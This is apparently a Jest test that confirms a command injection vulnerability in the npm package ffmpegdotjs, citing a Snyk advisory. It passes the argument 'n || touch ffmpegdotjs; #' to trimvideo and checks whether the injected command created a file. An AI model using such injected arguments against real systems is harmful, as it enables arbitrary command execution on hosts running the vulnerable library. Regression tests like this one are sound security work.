//https://snyk.io/vuln/SNYK-JS-FFMPEGDOTJS-1078542
test("Command Injection in ffmpegdotjs", () => {
  expect.assertions(2);
  let ffmpegdotjs = require("ffmpegdotjs");
  const fs = require("fs");
  const path = "./ffmpegdotjs";
  const sleep = require("sleep");
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
      // console.log('File removed:', path);
    }
  } catch (err) {
    console.error(err);
  }
  let file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  return ffmpegdotjs
    .trimvideo("package-lock.json", 0, 30, "n || touch ffmpegdotjs; #")
    .then(() => {})
    .catch((err) => {})
    .finally(() => {
      // console.log("here!");
      file_exist = fs.existsSync(path);
      expect(file_exist).toBe(true);
      fs.unlink(path, function (err) {});
    });
});
